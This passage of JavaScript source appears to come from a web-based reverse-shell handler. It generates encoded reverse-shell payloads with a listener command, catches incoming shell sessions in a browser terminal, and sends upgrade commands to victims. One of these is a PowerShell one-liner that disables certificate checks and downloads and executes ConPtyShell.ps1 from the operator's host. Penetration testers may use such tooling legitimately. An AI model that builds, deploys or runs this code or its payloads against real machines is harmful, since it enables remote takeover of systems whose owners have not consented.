  const ipInput = document.getElementById("gen-ip");
  if (ipInput && !ipInput.value) {
    ipInput.value = location.hostname || "127.0.0.1";
  }
  updateGeneratorOutput();
}

function updateGeneratorOutput() {
  const ip = document.getElementById("gen-ip")?.value || "10.10.10.10";
  const port = document.getElementById("gen-port")?.value || "4444";
  const shell = document.getElementById("gen-shell")?.value;
  const encoding = document.getElementById("gen-encoding")?.value;
  const out = document.getElementById("gen-output");
  const listenerOut = document.getElementById("gen-listener-output");

  if (!shell || !out) return;

  let cmd = SHELL_DB[shell] || "";

  // PowerShell base64 templates: always output as UTF-16LE base64 wrapped in powershell -e
  const isPSB64 = cmd.startsWith("PS_B64:");
  if (isPSB64) cmd = cmd.slice(7);

  // Replace both {IP}/{PORT} (uppercase) and {ip}/{port} (lowercase) placeholders
  cmd = cmd.replace(/\{IP\}/g, ip).replace(/\{ip\}/g, ip)
          .replace(/\{PORT\}/g, port).replace(/\{port\}/g, port);

  if (isPSB64) {
    // Encode as UTF-16LE then base64 — what PowerShell -EncodedCommand expects
    const codeUnits = new Uint16Array(cmd.length);
    for (let i = 0; i < codeUnits.length; i++) {
      codeUnits[i] = cmd.charCodeAt(i);
    }
    const charCodes = new Uint8Array(codeUnits.buffer);
    let bin = "";
    for (let i = 0; i < charCodes.byteLength; i++) {
      bin += String.fromCharCode(charCodes[i]);
    }
    cmd = "powershell -e " + btoa(bin);
  } else if (encoding === "url") {
    cmd = encodeURIComponent(cmd);
  } else if (encoding === "base64") {
    cmd = btoa(cmd);
  }

  out.textContent = cmd;
  if (listenerOut) {
    listenerOut.textContent = `nc -lvnp ${port}`;
  }
}

function copyGeneratorOutput() {
  const text = document.getElementById("gen-output")?.textContent || "";
  navigator.clipboard
    .writeText(text)
    .then(() => toast("Copied to clipboard", "ok"));
}

function copyListenerCommand() {
  const text =
    document.getElementById("gen-listener-output")?.textContent || "";
  navigator.clipboard
    .writeText(text)
    .then(() => toast("Copied to clipboard", "ok"));
}

// ── Catcher Listeners ──
function spawnListenerTab() {
  CT.tabCounter++;
  const tabId = `listener-${CT.tabCounter}`;

  // Create tab before the "+" button
  const tabsEl = document.getElementById("catcher-tabs");
  const addBtn = tabsEl.querySelector(".ctab-add");
  const tab = document.createElement("div");
  tab.className = "ctab";
  tab.id = `ctab-${tabId}`;
  const label = document.createElement("span");
  label.className = "ctab-label";
  label.textContent = "Listener";
  label.ondblclick = function (e) {
    e.stopPropagation();
    renameListenerTab(tabId, this);
  };
  const close = document.createElement("span");
  close.className = "ctab-close";
  close.innerHTML = "&times;";
  close.title = "Close";
  close.onclick = function (e) {
    e.stopPropagation();
    destroyListenerTab(tabId);
  };
  tab.appendChild(label);
  tab.appendChild(close);
  tab.onclick = function () {
    switchCatcherTab(tabId, this);
  };
  tabsEl.insertBefore(tab, addBtn);

  // Create setup panel with port form + start button
  const panel = document.createElement("div");
  panel.className = "cpanel";
  panel.id = `cpanel-${tabId}`;
  panel.innerHTML = `
    <div class="catcher-listener-panel">
      <div class="catcher-setup" id="setup-${tabId}">
        <div class="catcher-setup-row">
          <label>Port</label>
          <input type="number" id="setup-port-${tabId}" value="4444" min="1" max="65535" />
        </div>
        <button class="catcher-start-btn" id="setup-btn-${tabId}" onclick="startCatcherListener('${tabId}')">Start Listener</button>
      </div>
      <div class="catcher-sessions" id="sessions-${tabId}"></div>
    </div>`;
  document.querySelector(".catcher-layout").appendChild(panel);

  switchCatcherTab(tabId, tab);
}

function renameListenerTab(tabId, labelEl) {
  const current = labelEl.textContent;
  const input = document.createElement("input");
  input.type = "text";
  input.className = "ctab-rename-input";
  input.value = current;
  labelEl.textContent = "";
  labelEl.appendChild(input);
  input.focus();
  input.select();

  const finish = () => {
    const val = input.value.trim() || current;
    labelEl.textContent = val;
  };
  input.onblur = finish;
  input.onkeydown = (e) => {
    if (e.key === "Enter") input.blur();
    if (e.key === "Escape") {
      input.value = current;
      input.blur();
    }
  };
}

function startCatcherListener(tabId) {
  const portInput = document.getElementById(`setup-port-${tabId}`);
  const port = parseInt(portInput?.value, 10);
  if (!port || port < 1 || port > 65535) {
    toast("Invalid port (1-65535)", "error");
    return;
  }

  const btn = document.getElementById(`setup-btn-${tabId}`);
  if (btn) {
    btn.disabled = true;
    btn.textContent = "Starting...";
  }

  const csrf = document.querySelector('meta[name="csrf-token"]')?.content || "";
  fetch("/?catcher-api=start", {
    method: "POST",
    headers: { "Content-Type": "application/json", "X-CSRF-Token": csrf },
    body: JSON.stringify({ ip: "0.0.0.0", port }),
  })
    .then((r) => {
      if (!r.ok)
        return r.json().then((e) => {
          throw new Error(e.error || "Failed");
        });
      return r.json();
    })
    .then((info) => {
      CT.listeners[tabId] = { id: info.id, ip: info.ip, port, sessions: [] };

      // Update tab label to show port if user hasn't renamed it
      const tab = document.getElementById(`ctab-${tabId}`);
      const lbl = tab?.querySelector(".ctab-label");
      if (lbl && lbl.textContent === "Listener") lbl.textContent = port;

      // Replace setup form with listening status
      const setupEl = document.getElementById(`setup-${tabId}`);
      if (setupEl) {
        setupEl.className = "catcher-listener-header";
        setupEl.removeAttribute("id");
        setupEl.innerHTML = `
            <span>Listening on <strong>0.0.0.0:${port}</strong></span>
            <div class="catcher-header-actions">
              <button class="catcher-restart-btn" onclick="restartCatcherListener('${tabId}')">Restart</button>
              <button class="catcher-stop-btn" onclick="stopCatcherListener('${tabId}')">Stop</button>
            </div>`;
      }

      // Add empty sessions placeholder
      const sessContainer = document.getElementById(`sessions-${tabId}`);
      if (sessContainer && !sessContainer.querySelector(".catcher-empty")) {
        sessContainer.innerHTML =
          '<div class="catcher-empty">Waiting for connections...</div>';
      }

      toast(`Listener started on port ${port}`, "ok");
    })
    .catch((e) => {
      if (btn) {
        btn.disabled = false;
        btn.textContent = "Start Listener";
      }
      toast(e.message, "error");
    });
}

function stopCatcherListener(tabId) {
  const ln = CT.listeners[tabId];
  if (!ln) return;

  const csrf = document.querySelector('meta[name="csrf-token"]')?.content || "";
  fetch("/?catcher-api=stop", {
    method: "POST",
    headers: { "Content-Type": "application/json", "X-CSRF-Token": csrf },
    body: JSON.stringify({ id: ln.id }),
  })
    .then(() => {
      delete CT.listeners[tabId];

      // Disconnect sessions but leave their history cards in the DOM
      Object.keys(CT.sessions).forEach((sid) => {
        if (CT.sessions[sid].tabId === tabId) {
          if (CT.sessions[sid].ws) {
            CT.sessions[sid].ws.close();
            CT.sessions[sid].ws = null;
          }
          if (CT.sessions[sid].term) {
            CT.sessions[sid].term.write(
              "\r\n\x1b[31m[Listener stopped]\x1b[0m",
            );
          }
        }
      });

      // Swap header to stopped state
      const headerEl = document
        .getElementById(`cpanel-${tabId}`)
        ?.querySelector(".catcher-listener-header");
      if (headerEl) {
        headerEl.innerHTML = `
          <span class="catcher-stopped-text">Stopped on port <strong>${ln.port}</strong></span>
          <div class="catcher-header-actions">
            <button class="catcher-start-btn" onclick="showRestartForm('${tabId}', ${ln.port})">Restart</button>
          </div>`;
      }

      toast(`Listener on port ${ln.port} stopped`, "ok");
    })
    .catch(() => {});
}

function showRestartForm(tabId, lastPort) {
  const headerEl = document
    .getElementById(`cpanel-${tabId}`)
    ?.querySelector(".catcher-listener-header");
  if (!headerEl) return;
  headerEl.innerHTML = `
      <div class="catcher-setup-row">
        <label>Port</label>
        <input type="number" id="setup-port-${tabId}" value="${lastPort}" min="1" max="65535" />
      </div>
      <button class="catcher-start-btn" id="setup-btn-${tabId}" onclick="startCatcherListener('${tabId}')">Start Listener</button>`;
}

function restartCatcherListener(tabId) {
  const ln = CT.listeners[tabId];
  if (ln) {
    showRestartForm(tabId, ln.port);
  }
}

function destroyListenerTab(tabId) {
  const ln = CT.listeners[tabId];

  // Stop the backend listener if running
  if (ln) {
    const csrf =
      document.querySelector('meta[name="csrf-token"]')?.content || "";
    fetch("/?catcher-api=stop", {
      method: "POST",
      headers: { "Content-Type": "application/json", "X-CSRF-Token": csrf },
      body: JSON.stringify({ id: ln.id }),
    }).catch(() => {});
  }

  // Close all session WS
  Object.keys(CT.sessions).forEach((sid) => {
    if (CT.sessions[sid].tabId === tabId) {
      disconnectCatcherSession(sid);
    }
  });

  // Remove tab + panel from DOM
  document.getElementById(`ctab-${tabId}`)?.remove();
  document.getElementById(`cpanel-${tabId}`)?.remove();
  delete CT.listeners[tabId];

  // Switch to generator tab
  const genTab = document.querySelector("#catcher-tabs .ctab:not(.ctab-add)");
  if (genTab) genTab.click();
}

function switchCatcherTab(name, el) {
  document
    .querySelectorAll("#catcher-tabs .ctab")
    .forEach((t) => t.classList.remove("active"));
  document
    .querySelectorAll(".catcher-layout .cpanel")
    .forEach((p) => p.classList.remove("active"));
  if (el) el.classList.add("active");
  const panel = document.getElementById(`cpanel-${name}`);
  if (panel) panel.classList.add("active");

  // Clear badge if viewing catcher tab
  const badge = document.getElementById("catcher-badge");
  if (badge) badge.classList.remove("dot");
}

// ── Catcher Sessions ──
function onCatcherConnection(msg) {
  // Find which listener tab this belongs to
  let tabId = null;
  for (const [tid, ln] of Object.entries(CT.listeners)) {
    if (ln.id === msg.listenerID) {
      tabId = tid;
      break;
    }
  }
  if (!tabId) return;

  // Add session to state
  CT.sessions[msg.sessionID] = {
    id: msg.sessionID,
    listenerID: msg.listenerID,
    tabId,
    ws: null,
    term: null,
    lineMode: true,
    lineBuffer: "",
    osDetected: false,
    isWindows: false,
    detectBuf: "",
  };

  // Update UI
  const container = document.getElementById(`sessions-${tabId}`);
  if (container) {
    const empty = container.querySelector(".catcher-empty");
    if (empty) empty.remove();

    const sessionEl = document.createElement("div");
    sessionEl.className = "catcher-session";
    sessionEl.id = `session-${msg.sessionID}`;
    sessionEl.innerHTML = `
      <div class="catcher-session-header">
        <span class="catcher-session-addr">${esc(msg.remoteAddr)}</span>
        <button class="catcher-session-linemode active" onclick="toggleLineMode('${msg.sessionID}')" title="Toggle line mode (for unupgraded shells)">Line</button>
        <div class="catcher-upgrade-wrap">
          <button class="catcher-session-upgrade" onclick="this.parentElement.classList.toggle('open')" title="Upgrade shell">↑</button>
          <div class="catcher-upgrade-menu">
            <button onclick="upgradeCatcherUnix('${msg.sessionID}');this.closest('.catcher-upgrade-wrap').classList.remove('open')">Unix (PTY)</button>
            <button onclick="upgradeCatcherWindows('${msg.sessionID}');this.closest('.catcher-upgrade-wrap').classList.remove('open')">Windows (ConPtyShell)</button>
          </div>
        </div>
        <button class="catcher-session-resize" onclick="resizeCatcherTerm('${msg.sessionID}')" title="Resize terminal to fit"><svg width="14" height="14" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M1 5V1h4M11 1h4v4M15 11v4h-4M5 15H1v-4"/><path d="M1 1l5.5 5.5M15 15l-5.5-5.5"/></svg></button>
        <button class="catcher-session-connect" onclick="connectCatcherSession('${msg.sessionID}')">Connect</button>
        <button class="catcher-session-kill" onclick="killCatcherSession('${msg.sessionID}')">Kill</button>
      </div>
      <div class="catcher-terminal" id="term-${msg.sessionID}"></div>`;
    container.appendChild(sessionEl);
  }

  // Show badge
  const badge = document.getElementById("catcher-badge");
  if (badge) badge.classList.add("dot");

  toast(`Reverse shell from ${msg.remoteAddr}`, "ok");
}

function connectCatcherSession(sessionID) {
  const s = CT.sessions[sessionID];
  if (!s) return;

  // Already connected?
  if (s.ws && s.ws.readyState === WebSocket.OPEN) return;

  const proto = location.protocol === "https:" ? "wss" : "ws";
  const ws = new WebSocket(
    `${proto}://${location.host}/?catcher-ws&session=${sessionID}`,
  );
  ws.binaryType = "arraybuffer";

  const container = document.getElementById(`term-${sessionID}`);
  if (!container) return;

  // Hide connect button
  const btn = container.parentElement.querySelector(".catcher-session-connect");
  if (btn) btn.style.display = "none";

  // Create xterm
  const term = new Terminal({
    theme: {
      background: "#2e3440",
      foreground: "#d8dee9",
      cursor: "#88c0d0",
      selectionBackground: "#434c5e",
    },
    fontFamily: "'Fira Code VF', monospace",
    fontSize: 14,
    cursorBlink: true,
    scrollback: 5000,
  });
  term.open(container);

  // FitAddon — sizes terminal to container
  const FitAddonCtor = window.FitAddon?.FitAddon || window.FitAddon;
  const fitAddon = new FitAddonCtor();
  term.loadAddon(fitAddon);

  // Safe resize: always start with a valid size, then let FitAddon refine
  const fitTerm = () => {
    requestAnimationFrame(() => {
      try {
        fitAddon.fit();
      } catch (e) {}
    });
  };
  term.resize(80, 24);
  // Let the renderer paint, then fit to container
  setTimeout(fitTerm, 150);

  // Watch the session card (parent) — it's what actually changes when the flex layout recomputes
  const sessionCard = container.parentElement;
  const ro = new ResizeObserver(fitTerm);
  if (sessionCard) ro.observe(sessionCard);
  ro.observe(container);
  window.addEventListener("resize", fitTerm);

  // Attach WS to terminal manually (not using addon since WS is not standard)
  ws.onmessage = (e) => {
    if (e.data instanceof ArrayBuffer) {
      const bytes = new Uint8Array(e.data);
      term.write(bytes);

      // Auto-detect OS from initial shell output
      if (!s.osDetected) {
        try { s.detectBuf += new TextDecoder().decode(bytes); } catch(_) {}
        if (s.detectBuf.length > 4096) s.detectBuf = s.detectBuf.slice(-4096);

        if (/[A-Z]:\\|PS [A-Z]:\\|Microsoft Windows/i.test(s.detectBuf)) {
          // Windows detected — keep line mode on
          s.isWindows = true;
          s.osDetected = true;
        } else if (/[$#]\s*$|\r\n\$|\r\n#|\/home\/|\/usr\/|\/bin\/(ba)?sh/i.test(s.detectBuf)) {
          // Linux detected — disable line mode, grey out button
          s.isWindows = false;
          s.osDetected = true;
          s.lineMode = false;
          s.lineBuffer = "";
          const lbtn = document.querySelector(`#session-${sessionID} .catcher-session-linemode`);
          if (lbtn) { lbtn.classList.remove("active"); lbtn.disabled = true; }
        }
      }
    }
  };

  term.onData((data) => {
    if (ws.readyState !== WebSocket.OPEN) return;
    const enc = new TextEncoder();

    if (!s.lineMode) {
      // Raw mode: send immediately
      ws.send(enc.encode(data));
      return;
    }

    // Line mode: buffer input with local echo, send complete line on Enter
    for (const ch of data) {
      if (ch === "\r") {
        // Enter: send buffered line
        term.write("\r\n");
        ws.send(enc.encode(s.lineBuffer + "\r\n"));
        s.lineBuffer = "";
      } else if (ch === "\x7f" || ch === "\b") {
        // Backspace
        if (s.lineBuffer.length > 0) {
          s.lineBuffer = s.lineBuffer.slice(0, -1);
          term.write("\b \b");
        }
      } else if (ch === "\x03") {
        // Ctrl+C: send raw, clear buffer
        term.write("^C\r\n");
        ws.send(enc.encode("\x03"));
        s.lineBuffer = "";
      } else if (ch === "\x15") {
        // Ctrl+U: clear line
        const len = s.lineBuffer.length;
        if (len > 0) {
          term.write("\r\x1b[K");
          s.lineBuffer = "";
        }
      } else if (ch.charCodeAt(0) >= 0x20) {
        // Printable character
        s.lineBuffer += ch;
        term.write(ch);
      }
      // Other control chars / escape sequences ignored in line mode
    }
  });

  ws.onopen = () => {
    setTimeout(fitTerm, 50);
  };

  ws.onclose = () => {
    term.write("\r\n\x1b[31m[Disconnected]\x1b[0m");
    ro.disconnect();
    window.removeEventListener("resize", fitTerm);
  };

  s.ws = ws;
  s.term = term;
  s.fitAddon = fitAddon;

  // Auto-connect on button click also switches to this listener tab
  const panel = document.getElementById(`cpanel-${s.tabId}`);
  if (panel && !panel.classList.contains("active")) {
    const tab = document.getElementById(`ctab-${s.tabId}`);
    if (tab) tab.click();
  }
}

function toggleLineMode(sessionID) {
  const s = CT.sessions[sessionID];
  if (!s) return;
  s.lineMode = !s.lineMode;
  s.lineBuffer = "";
  const btn = document.querySelector(`#session-${sessionID} .catcher-session-linemode`);
  if (btn) btn.classList.toggle("active", s.lineMode);
}

function resizeCatcherTerm(sessionID) {
  const s = CT.sessions[sessionID];
  if (s?.fitAddon) {
    requestAnimationFrame(() => {
      try {
        s.fitAddon.fit();
      } catch (e) {}
    });
  }
}

function upgradeCatcherUnix(sessionID) {
  const s = CT.sessions[sessionID];
  if (!s?.ws || s.ws.readyState !== WebSocket.OPEN) {
    toast("Connect to the session first", "err");
    return;
  }
  const enc = new TextEncoder();
  const rows = s.term?.rows || 24;
  const cols = s.term?.cols || 80;
  // Set terminal type
  s.ws.send(enc.encode("export TERM=xterm-256color\n"));
  // Attempt PTY upgrade — tries multiple methods, errors suppressed
  setTimeout(() => {
    if (s.ws?.readyState !== WebSocket.OPEN) return;
    s.ws.send(
      enc.encode(
        "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || " +
          "python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || " +
          "script /dev/null -qc /bin/bash 2>/dev/null || true\n",
      ),
    );
  }, 200);
  // Set terminal dimensions after upgrade has time to complete
  setTimeout(() => {
    if (s.ws?.readyState !== WebSocket.OPEN) return;
    s.ws.send(enc.encode(`stty rows ${rows} cols ${cols}\n`));
  }, 1500);
  // PTY provides proper terminal handling — switch to raw mode
  s.lineMode = false;
  s.lineBuffer = "";
  const btn = document.querySelector(`#session-${sessionID} .catcher-session-linemode`);
  if (btn) btn.classList.remove("active");
}

function upgradeCatcherWindows(sessionID) {
  const s = CT.sessions[sessionID];
  if (!s?.ws || s.ws.readyState !== WebSocket.OPEN) {
    toast("Connect to the session first", "err");
    return;
  }
  const rows = s.term?.rows || 24;
  const cols = s.term?.cols || 80;
  const enc = new TextEncoder();
  const proto = location.protocol === "https:" ? "https" : "http";
  const host = location.host;
  const url = `${proto}://${host}/ConPtyShell.ps1?embedded`;
  // Skip cert validation for self-signed certs, then download and run ConPtyShell
  // -Upgrade hijacks the existing socket so no second connection needed
  const cmd =
    `[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;` +
    `Add-Type -TypeDefinition 'using System.Net;using System.Security.Cryptography.X509Certificates;public class Trust{public static void Enable(){System.Net.ServicePointManager.ServerCertificateValidationCallback=delegate{return true;};}}';[Trust]::Enable();` +
    `IEX((New-Object Net.WebClient).DownloadString('${url}'));Invoke-ConPtyShell -Upgrade -Rows ${rows} -Cols ${cols}\n`;
  s.ws.send(enc.encode(cmd));
  // ConPtyShell provides a proper PTY — switch to raw mode
  s.lineMode = false;
  s.lineBuffer = "";
  const btn = document.querySelector(`#session-${sessionID} .catcher-session-linemode`);
  if (btn) btn.classList.remove("active");
  toast("Sent ConPtyShell upgrade command", "ok");
}

function disconnectCatcherSession(sessionID) {
  const s = CT.sessions[sessionID];
  if (!s) return;
  if (s.ws) {
    s.ws.close();
    s.ws = null;
  }
  if (s.term) {
    s.term.dispose();
    s.term = null;
  }
  delete CT.sessions[sessionID];
}

function killCatcherSession(sessionID) {
  const csrf = document.querySelector('meta[name="csrf-token"]')?.content || "";
  fetch("/?catcher-api=kill-session", {
    method: "POST",
    headers: { "Content-Type": "application/json", "X-CSRF-Token": csrf },
    body: JSON.stringify({ id: sessionID }),
  })
    .then(() => {
      disconnectCatcherSession(sessionID);
      document.getElementById(`session-${sessionID}`)?.remove();
    })
    .catch(() => {});
}

// ── Init ──
function initCatcher() {
  initGenerator();
}
